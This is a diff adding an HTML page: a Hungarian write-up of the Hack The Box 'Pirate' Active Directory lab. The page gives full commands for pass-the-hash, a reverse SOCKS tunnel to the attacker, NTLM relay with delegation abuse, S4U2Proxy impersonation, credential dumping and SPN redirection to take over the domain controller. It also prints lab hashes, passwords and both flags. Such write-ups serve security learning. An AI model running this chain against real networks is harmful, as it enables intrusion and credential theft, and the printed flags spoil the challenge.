@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Pirate - Magyar Writeup</title>
+    <style>
+        body { font-family: "Segoe UI", Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: "Consolas", monospace; position: relative; margin: 20px 0; }
+        code { font-family: "Consolas", monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTB Pirate - Magyar Writeup</h1>
+        <p style="text-align:left; margin-top:-15px; color:#555;"><strong>Kategória:</strong> Hard</p>
+
+        <div class="section">
+            <p>
+                A Pirate egy Windows Active Directory gép, ahol az első ránézésre kézenfekvő út valójában zsákutca.
+                A nyitóoldalon látható IIS felület inkább díszlet, mint valódi belépési pont. A működő támadási lánc
+                doménhitelesítés-ellenőrzésből, régi gépfiókok visszaéléséből, gMSA jelszóanyag kinyeréséből, egy belső
+                átjárásból a <code>WEB01</code> felé, majd NTLM relay és delegációs visszaélésből áll a user célhoz.
+                Innen a végjátékot a hitelesítési adatok visszanyerése és az SPN-átirányítás hozza el, amivel végül a
+                tartományvezérlő is kézbe vehető. Ez a writeup a ténylegesen bejárt, ellenőrzött útvonalat rögzíti,
+                amellyel a user és a root flag is megszerezhető volt.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>1. Felderítés</h2>
+            <span class="tag tag-info">INFO</span>
+            <p>
+                Kívülről nézve a célpont szándékosan érdektelennek tűnt. A 80-as porton csak egy alap IIS oldal látszott,
+                a 443-as pedig bontotta a TLS kapcsolatot. Ez erősen arra utalt, hogy nem klasszikus webes dobozként,
+                hanem Active Directory környezetként érdemes kezelni.
+            </p>
+            <pre><code>nmap -Pn -sV -T4 -p 22,80,443,8000,8080 10.129.6.124</code></pre>
+            <pre><code>80/tcp   open     http    Microsoft IIS 10.0
+443/tcp  open     ssl?    connection reset
+22/tcp   filtered ssh
+8000/tcp filtered http-alt
+8080/tcp filtered http-proxy</code></pre>
+            <p>
+                A nyilvános leírások is arra mutattak, hogy a valódi út egy belső AD-lánc, benne gépfiókos visszaéléssel
+                és egy <code>WEB01</code> nevű belső hosttal. Ennek megfelelően a további lépések előtt helyben felvettem a
+                szükséges névfeloldásokat.
+            </p>
+            <pre><code>10.129.6.124 pirate.htb DC01.pirate.htb DC01
+192.168.100.2 web01.pirate.htb WEB01</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>2. A kezdeti doménes hitelesítő adatok ellenőrzése</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                Az első valóban használható lépés az ismert, alacsony jogosultságú doménfiók kipróbálása volt. Az SMB
+                azonnal visszaigazolta, hogy a hitelesítő adatok érvényesek, és azt is, hogy tényleg egy tartományvezérlővel
+                van dolgunk.
+            </p>
+            <pre><code>smbclient -L //10.129.6.124 -U 'PIRATE\pentest%p3nt3st2025!&amp;'</code></pre>
+            <p>
+                Amint ez működött, felesleges lett volna tovább bámulni az IIS kezdőlapot. A belépőszintű doménfiók már
+                önmagában elég volt ahhoz, hogy a valódi AD-s útvonalon menjünk tovább.
+            </p>
+            <pre><code>Username: pentest
+Password: p3nt3st2025!&amp;</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>3. Régi gépfiókok kihasználása</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                A nyilvános források következetesen azt mutatták, hogy régebbi gépfiókoknál még él a klasszikus,
+                pre-Windows 2000-es jelszóminta. Mielőtt Kerberos-jegyeket kértem volna, a támadó gép óráját a
+                tartományvezérlő idejéhez igazítottam, hogy ne időeltolódás miatt hasaljon el az egész.
+            </p>
+            <pre><code>curl -ksSI http://10.129.6.124/ | grep '^Date:'
+sudo date -u -s '2026-05-29 00:15:31'
+
+KRB5CCNAME=MS01.ccache impacket-getTGT 'pirate.htb/MS01$:ms01'
+KRB5CCNAME=EXCH01.ccache impacket-getTGT 'pirate.htb/EXCH01$:exch01'</code></pre>
+            <p>
+                A Kerberos-kérések gond nélkül lefutottak. Ez gyakorlatban azt jelentette, hogy ezek a gépfiókok még mindig
+                a kiszámítható, régi jelszómintát használják, tehát volt mire építeni a következő lépést.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>4. Az MS01$ átvétele és a gMSA adatok kinyerése</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                A megszerzett Kerberos-jegy önmagában még kevés volt, ezért a kézben lévő gépfiók jelszavát lecseréltem,
+                majd ezzel olvastam ki azokat az LDAP-adatokat, amelyek a kezelt szolgáltatásfiókhoz tartoztak.
+            </p>
+            <pre><code>impacket-changepasswd pirate.htb/MS01$:ms01@10.129.6.124 -newpass 'Boltech@123'</code></pre>
+            <p>
+                Miután az MS01$ felett ténylegesen átvettük az irányítást, olvashatóvá váltak a gMSA adatok is. Ezek közül
+                a legértékesebb az ADFS-hez tartozó NTLM anyag volt, mert ez később egyszerre adott belépést és relay-lehetőséget.
+            </p>
+            <pre><code>gMSA_ADFS_prod$ : 76754c94319e3a7dc07ba09aa79028ee</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>5. WinRM belépés és átjárás a belső WEB01 gépre</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                A gMSA-hoz tartozó NTLM hash segítségével sikerült WinRM hozzáférést szerezni a kívülről elérhető gépre.
+                Innen gyorsan ellenőrizhető volt, hogy a belső <code>WEB01</code> gép a 5985-ös porton elérhető. Ezután egy
+                fordított SOCKS átjárást állítottam fel, hogy a belső eszközök használata ne legyen szenvedés.
+            </p>
+            <pre><code>evil-winrm -i 10.129.6.124 -u 'gMSA_ADFS_prod$' -H '76754c94319e3a7dc07ba09aa79028ee'
+
+Test-NetConnection 192.168.100.2 -Port 5985
+chisel server --port 8001 --reverse
+chisel.exe client 10.10.14.242:8001 R:socks</code></pre>
+            <p>
+                Amint a SOCKS alagút felállt, minden későbbi kapcsolatot a <code>WEB01</code> felé már tisztán,
+                <code>proxychains4</code> mögül vittem tovább.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>6. NTLM relay LDAPS ellen</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                Az érdemi szintlépést az hozta meg, hogy a <code>WEB01$</code> gépfiók hitelesítését sikerült TLS-en védett
+                LDAP felé továbbítani a tartományvezérlőn. Ehhez elindítottam az <code>ntlmrelayx</code> eszközt delegációs
+                visszaéléssel, majd a belső átjáráson keresztül a <code>Coercer</code> segítségével rákényszerítettem a
+                WEB01-et, hogy visszafelé hitelesítsen a saját figyelőmre.
+            </p>
+            <pre><code>sudo tmux new-session -d -s pirate-relay \
+"impacket-ntlmrelayx -t ldaps://10.129.6.124 --no-http-server --delegate-access --remove-mic -smb2support"
+
+proxychains4 -f proxychains-pirate.conf coercer coerce \
+-l 10.10.14.242 \
+-t 192.168.100.2 \
+-u GMSA_ADFS_prod$ \
+--hash :76754c94319e3a7dc07ba09aa79028ee \
+-d pirate.htb --always-continue</code></pre>
+            <p>
+                A relay sikeres volt, és automatikusan létrehozott egy új, delegálható gépfiókot. Innentől a lánc már szépen
+                gurult lefelé, mint egy rossz döntés péntek délután.
+            </p>
+            <pre><code>Authenticating against ldaps://10.129.6.124 as PIRATE/WEB01$ SUCCEED
+Adding new computer with username: KAJTHDVE$ and password: hgpCsk67PSZ)!ry result: OK
+Delegation rights modified succesfully!
+KAJTHDVE$ can now impersonate users on WEB01$ via S4U2Proxy</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>7. S4U2Proxy visszaélés és a user flag megszerzése</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                Miután a delegálható gépfiók elkészült, kértem egy Kerberos szolgáltatásjegyet a
+                <code>cifs/web01.pirate.htb</code> szolgáltatáshoz úgy, hogy közben az <code>Administrator</code> személyét
+                vettem fel. Ezt a jegyet aztán <code>psexec</code>-kel, a SOCKS átjáráson keresztül használtam fel arra,
+                hogy egyetlen paranccsal kiolvassam a user flaget <code>a.white</code> asztaláról.
+            </p>
+            <pre><code>impacket-getST -spn cifs/web01.pirate.htb \
+-impersonate Administrator \
+-dc-ip 10.129.6.124 \
+'pirate.htb/KAJTHDVE$:hgpCsk67PSZ)!ry'
+
+export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
+proxychains4 -q impacket-psexec -k -no-pass pirate.htb/Administrator@web01.pirate.htb \
+"cmd.exe /c type C:\Users\a.white\Desktop\user.txt"</code></pre>
+            <pre><code>ed43e2a68915c007c0942cb8fd85e9bc</code></pre>
+            <p>
+                Ezzel igazolhatóvá vált, hogy kiemelt jogosultságú végrehajtásunk van a WEB01-en, és a user cél ezzel meg is lett.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>8. Újrahasznosítható titkok kinyerése a WEB01-ről</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                Az interaktív <code>psexec</code> shell a WEB01-en meglehetősen hisztis volt, rendszeresen szétesett SMB-s
+                paraméterhibákkal. Ahelyett, hogy ezen birkóztam volna tovább, áttértem az egyparancsos végrehajtásra,
+                és távolról lementettem a helyi titkokat. A már megszerzett Kerberos-jeggyel a <code>secretsdump</code>
+                VSS módját használtam.
+            </p>
+            <pre><code>export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
+proxychains4 -f proxychains-pirate.conf -q impacket-secretsdump \
+-k -no-pass -use-vss -exec-method smbexec \
+-target-ip 192.168.100.2 pirate.htb/Administrator@web01.pirate.htb</code></pre>
+            <p>
+                Ez adta meg a root útvonalhoz szükséges legfontosabb anyagot, köztük <code>a.white</code> tiszta szöveges jelszavát is.
+            </p>
+            <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
+PIRATE\a.white:E2nvAOKSz5Xz2MJu</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>9. Az a.white_adm fiók átvétele</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                A nyilvános útvonalak alapján <code>a.white</code> rendelkezett olyan delegált joggal, amellyel vissza tudta
+                állítani <code>a.white_adm</code> jelszavát. Miután a WEB01-ről megszereztem <code>a.white</code> jelszavát,
+                a következő lépés már szinte prózai volt: ugyanazzal a joggal átvettem a magasabb jogosultságú fiókot.
+            </p>
+            <pre><code>bloodyAD --host 10.129.6.124 -d pirate.htb \
+-u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
+set password a.white_adm 'Boltech@123'</code></pre>
+            <pre><code>[+] Password changed successfully!</code></pre>
+            <p>
+                Innentől a tartomány teljes átvétele már jóval közelebb került, mert az <code>a.white_adm</code> fióknál
+                már megvoltak azok a jogok, amelyek az SPN-manipulációhoz kellettek.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>10. SPN-átirányítás a WEB01-ről a DC01 felé</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                Az <code>a.white_adm</code> fiók írhatta a gépfiókokhoz tartozó SPN-eket. A kulcsfontosságú
+                <code>HTTP/WEB01.pirate.htb</code> szolgáltatásnév eredetileg a <code>WEB01$</code> objektumon volt, ezért
+                először onnan el kellett venni, majd hozzáadni a <code>DC01$</code> objektumhoz. Ez a lépés a teljes trükk magja.
+            </p>
+            <pre><code>ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' &lt;&lt;EOF
+dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+changetype: modify
+delete: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+-
+EOF
+
+ldapmodify -x -H ldap://10.129.6.124 -D 'PIRATE\a.white_adm' -w 'Boltech@123' &lt;&lt;EOF
+dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+-
+EOF</code></pre>
+            <p>
+                Mindkét módosítás sikerült. Ezzel elértük, hogy a WEB01 HTTP szolgáltatására érkező Kerberos-kérések egy
+                olyan delegációs útvonalra forduljanak rá, amely végül a tartományvezérlőn landol.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>11. Administrator jegy készítése a DC01-hez</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                Miután az SPN a helyére került, az <code>a.white_adm</code> fiókkal kértem egy szolgáltatásjegyet úgy,
+                hogy közben az <code>Administrator</code> nevében jártam el, majd az <code>-altservice</code> kapcsolóval a
+                szolgáltatást <code>CIFS/DC01.pirate.htb</code>-re váltottam át.
+            </p>
+            <pre><code>impacket-getST -spn 'HTTP/WEB01.pirate.htb' \
+-impersonate Administrator \
+-dc-ip 10.129.6.124 \
+'pirate.htb/a.white_adm:Boltech@123' \
+-altservice 'CIFS/DC01.pirate.htb'</code></pre>
+            <pre><code>[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache</code></pre>
+            <p>
+                Ezzel elkészült az a Kerberos-jegy, amelyet már közvetlenül a tartományvezérlő ellen lehetett használni
+                <code>Administrator</code> jogosultsággal.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>12. A tartományvezérlő átvétele és a root flag</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>
+                A zárólépés már meglepően egyenes volt. Miután beállítottam a frissen létrehozott Kerberos cache-t,
+                <code>psexec</code>-kel csatlakoztam a DC01-hez, majd egyetlen paranccsal kiolvastam a root flaget az
+                Administrator asztaláról.
+            </p>
+            <pre><code>export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
+proxychains4 -f proxychains-pirate.conf -q impacket-psexec -k -no-pass \
+pirate.htb/Administrator@dc01.pirate.htb \
+"cmd.exe /c type C:\Users\Administrator\Desktop\root.txt"</code></pre>
+            <pre><code>0213cf10745f7800a3f40b042d6c4319</code></pre>
+            <p>
+                Ez már egyértelműen a tartományvezérlő teljes kompromittálását jelentette. Innen nincs nagyon mit szépíteni.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>13. Kihagyott zsákutcák</h2>
+            <span class="tag tag-failure">ZSÁKUTCA</span>
+            <p>
+                Az alap IIS oldal a kezdeti kompromittálás szempontjából használhatatlan volt, és a korai WinRM hozzáférésből
+                a <code>user.txt</code> közvetlen kiolvasása sem vezetett sehova. Ugyanígy a belső gépre IP alapján történő
+                közvetlen PowerShell-távművelet Kerberos mellett megbízhatatlanul viselkedett, az interaktív
+                <code>impacket-psexec</code> shell pedig a WEB01-en rendre széthullott <code>STATUS_INVALID_PARAMETER</code>
+                hibákkal. A tiszta megoldás az volt, hogy nem webes dobozként kezeltem a Pirate-ot, a törékeny interaktív
+                shell helyett egyparancsos végrehajtásra váltottam, és végigvittem az AD-s láncot a régi gépfiókos
+                visszaéléstől egészen a DC01 elleni SPN-átirányításig.
+            </p>
+        </div>
+
+        <div class="footer">
+            <p>HTB Pirate Magyar Writeup | 2026.May.29</p>
+        </div>
+    </div>
+</body>
+</html>
